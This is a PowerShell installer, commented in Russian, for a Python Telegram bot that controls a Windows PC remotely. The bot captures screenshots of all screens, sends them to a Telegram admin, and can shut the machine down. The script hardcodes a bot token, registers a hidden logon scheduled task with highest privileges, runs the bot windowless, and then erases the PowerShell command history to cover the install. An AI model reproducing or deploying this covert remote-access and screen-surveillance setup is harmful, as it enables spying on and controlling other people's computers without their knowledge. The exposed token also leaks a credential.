# 1. Рабочая папка в системе
$botDir = "C:\ProgramData\TelegramPCBot"
if (-not (Test-Path $botDir)) { New-Item -ItemType Directory -Path $botDir -Force | Out-Null }

# 2. Код обновленного бота с кнопками
$botCode = @"
import os
import subprocess
import telebot
from telebot import types
from PIL import ImageGrab

TOKEN = "9090353860:AAEKHH_hnMcN8Xux7JRI7tha0bPF-lHtTL4" 
ADMIN_ID = 1468733354

bot = telebot.TeleBot(TOKEN)

def check_access(user_id):
    return user_id == ADMIN_ID

def get_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn_status = types.KeyboardButton("🖥️ Статус ПК")
    btn_screen = types.KeyboardButton("📸 Сделать скриншот")
    btn_off = types.KeyboardButton("⚠️ Выключить ПК")
    markup.add(btn_status, btn_screen)
    markup.add(btn_off)
    return markup

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if check_access(message.from_user.id):
        bot.send_message(
            message.chat.id, 
            "🤖 Бот управления ПК активен. Используйте кнопки внизу для отправки команд:", 
            reply_markup=get_keyboard()
        )

@bot.message_handler(content_types=['text'])
def handle_text(message):
    if not check_access(message.from_user.id):
        return

    if message.text == "🖥️ Статус ПК":
        bot.reply_to(message, "🖥️ Компьютер онлайн и принимает команды.")
        
    elif message.text == "📸 Сделать скриншот":
        bot.send_message(message.chat.id, "📸 Создаю снимок экрана...")
        try:
            path = os.path.join("$botDir", "screen.png")
            # Снимок всех экранов
            screenshot = ImageGrab.grab(all_screens=True)
            screenshot.save(path)
            with open(path, 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove(path)
        except Exception as e:
            bot.reply_to(message, f"❌ Не удалось сделать скриншот: {str(e)}\n(Если бот запущен как служба, у него может не быть доступа к графическому экрану пользователя)")
            
    elif message.text == "⚠️ Выключить ПК":
        bot.reply_to(message, "🛑 Инициировано завершение работы. Компьютер выключится через 5 секунд.")
        subprocess.run(["shutdown", "/s", "/t", "5"], shell=True)

if __name__ == '__main__':
    bot.infinity_polling()
"@

Set-Content -Path "$botDir\mysystem_bot.py" -Value $botCode -Encoding UTF8

# 3. Автоматическая установка библиотек на компьютер
pip install pyTelegramBotAPI Pillow screeninfo --quiet

# 4. Пересоздаем задачу в Планировщике Windows с правами интерактивного взаимодействия
# Чтобы у бота был доступ к вашему экрану для скриншотов, задача должна запускаться под текущим пользователем во время входа
$current_user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$action = New-ScheduledTaskAction -Execute "pythonw.exe" -Argument "$botDir\mysystem_bot.py"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId $current_user -RunLevel Highest

# Принудительно удаляем старую задачу, если она была, и ставим обновленную
Unregister-ScheduledTask -TaskName "TelegramPCControlBot" -Confirm:$false -ErrorAction SilentlyContinue
Register-ScheduledTask -TaskName "TelegramPCControlBot" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

# Прекращаем работу старого процесса pythonw, чтобы запустить обновленную версию
Stop-Process -Name "pythonw" -Force -ErrorAction SilentlyContinue

# 5. Запуск обновленного скрипта
Start-Process "pythonw.exe" -ArgumentList "$botDir\mysystem_bot.py"

# 6. Очистка истории вбитых команд на этом компьютере
Clear-History
$historyPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue }
Clear-Host
